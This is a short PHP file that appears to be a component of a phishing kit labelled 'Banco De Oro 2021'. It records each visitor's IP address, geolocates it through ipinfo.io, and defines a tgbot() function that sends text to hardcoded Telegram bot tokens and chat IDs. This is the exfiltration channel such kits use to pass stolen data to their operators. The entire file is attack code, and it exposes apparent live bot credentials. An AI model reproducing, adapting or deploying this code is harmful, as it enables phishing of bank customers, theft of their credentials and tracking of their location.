<?php
date_default_timezone_set("Asia/Hong_Kong");
$i = $_SERVER['REMOTE_ADDR'];
$t = "2124939449:AAFzBqpR4ZW5jOHSu80fjno_HVeymSrrXjc";
$c = "-627079543";
$d = date("F j, Y, g:i a");
$tite = $_SERVER['HTTP_HOST'];
$haha = $_SERVER['PHP_SELF'];
$bobomo = "http://".$tite.$haha;
function ip_details($i) 
{
    $json = file_get_contents("http://ipinfo.io/{$i}");
    $details = json_decode($json);
    return $details;
}



$details = ip_details("$i");
function tgbot($m, $c = "-998553050", $t = "5970469513:AAHWZisvJ8TzOvfKJRjASTy1mnEXdNHA67k") {
    $url = "https://api.telegram.org/bot" . $t . "/sendMessage?chat_id=" . $c;
    $v = str_replace(array('-------------------[Banco De Oro 2021]-----------------\n', '-------------------[Banco De Oro 2021]-----------------\n', '---------------------[ODIN LIF3]---------------------\n', '---------------------[EXPLOR3R 404]---------------------\n'), '', $m);
    $url = $url . "&text=" . urlencode($v);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

?>